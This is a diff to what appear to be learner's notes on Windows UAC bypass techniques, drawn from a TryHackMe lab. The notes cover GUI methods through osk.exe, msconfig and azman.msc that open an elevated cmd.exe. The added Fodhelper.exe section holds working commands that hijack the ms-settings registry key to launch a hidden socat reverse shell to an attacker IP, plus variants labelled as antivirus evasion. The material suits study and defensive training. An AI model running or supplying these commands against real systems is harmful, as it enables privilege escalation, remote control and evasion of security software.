@@ -480,6 +480,71 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 then we could check [UACME list](https://github.com/hfiref0x/UACME?tab=readme-ov-file#usage)
 
 
+## GUI UAC Bypass
+
+
+## technique number 55: GUI osk.exe or msconfig.exe
+```
+Author: James Forshaw
+
+    Type: GUI Hack
+    Method: UIPI bypass with token modification
+    Target(s): \system32\osk.exe, \system32\msconfig.exe
+    Component(s): Attacker defined
+    Implementation: ucmTokenModUIAccessMethod
+    Works from: Windows 7 (7600)
+    Fixed in: unfixed 🙈
+        How: -
+    Code status: added in v3.1.5
+
+```
+
+### Exploit 
+1) using run
+
+
+![Screenshot 2024-07-23 at 10-47-11 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/3b302e6f-1250-4009-b2dc-f0f54ad3504f)
+
+2) By navigating to the Tools tab, we can find an option to open cmd
+
+
+![Screenshot 2024-07-23 at 10-47-25 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/c384c3ed-c60e-4e78-95bb-d62c02b06966)
+
+3) press launch
+
+
+
+## example: azman.msc 
+1) using run
+
+
+![Screenshot 2024-07-23 at 10-56-48 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/4d23210b-c977-493a-a237-0aad379dc179)
+
+2) To run a shell, we will abuse the application's help
+
+
+![Screenshot 2024-07-23 at 10-56-55 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/1d7fe324-d47a-41b9-a38e-e3b02e2ef52e)
+
+
+3) On the help screen, we will right-click any part of the help article and select View Source
+
+
+![Screenshot 2024-07-23 at 10-57-00 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/2ed07d4b-8b58-406d-bb57-fb36eb73433d)
+
+
+4) go to `File->Open` and make sure to select `All Files` in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select `Open`:
+
+
+![Screenshot 2024-07-23 at 10-57-08 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/9ac539fe-1dcd-47d2-9b77-792260d24b2a)
+
+
+
+
+
+
+
+## No GUI UAC Bypass
+
 ## technique number 54 example: SystemProperties*.exe Dll Hijack
 ```
 Author: egre55
@@ -524,56 +589,50 @@ C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 ```
 
-## technique number 55: GUI osk.exe or msconfig.exe
-```
-Author: James Forshaw
+## technique number 33: Fodhelper.exe
 
-    Type: GUI Hack
-    Method: UIPI bypass with token modification
-    Target(s): \system32\osk.exe, \system32\msconfig.exe
+```
+    Type: Shell API
+    Method: Registry key manipulation
+    Target(s): \system32\fodhelper.exe
     Component(s): Attacker defined
-    Implementation: ucmTokenModUIAccessMethod
-    Works from: Windows 7 (7600)
+    Implementation: ucmShellRegModMethod
+    Works from: Windows 10 TH1 (10240)
     Fixed in: unfixed 🙈
         How: -
-    Code status: added in v3.1.5
+    Code status: added in v2.7.2
 
 ```
 
 ### Exploit 
-1) using run
 
+```powershell
 
-![Screenshot 2024-07-23 at 10-47-11 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/3b302e6f-1250-4009-b2dc-f0f54ad3504f)
+# cmd
 
-2) By navigating to the Tools tab, we can find an option to open cmd
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f
+fodhelper.exe
 
+```
 
-![Screenshot 2024-07-23 at 10-47-25 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/c384c3ed-c60e-4e78-95bb-d62c02b06966)
+**Bypass AV detection**
 
-3) press launch
+```powershell
+#cmd
 
-## example: azman.msc 
-1) using run
+# race condtion
+set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
 
-
-![Screenshot 2024-07-23 at 10-56-48 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/4d23210b-c977-493a-a237-0aad379dc179)
-
-2) To run a shell, we will abuse the application's help
-
-
-![Screenshot 2024-07-23 at 10-56-55 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/1d7fe324-d47a-41b9-a38e-e3b02e2ef52e)
-
-
-3) On the help screen, we will right-click any part of the help article and select View Source
-
-
-![Screenshot 2024-07-23 at 10-57-00 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/2ed07d4b-8b58-406d-bb57-fb36eb73433d)
-
-
-4) go to `File->Open` and make sure to select `All Files` in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select `Open`:
-
-
-![Screenshot 2024-07-23 at 10-57-08 TryHackMe Bypassing UAC](https://github.com/user-attachments/assets/9ac539fe-1dcd-47d2-9b77-792260d24b2a)
-
+# different registry keys 
+set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
+reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+fodhelper.exe
+```
 
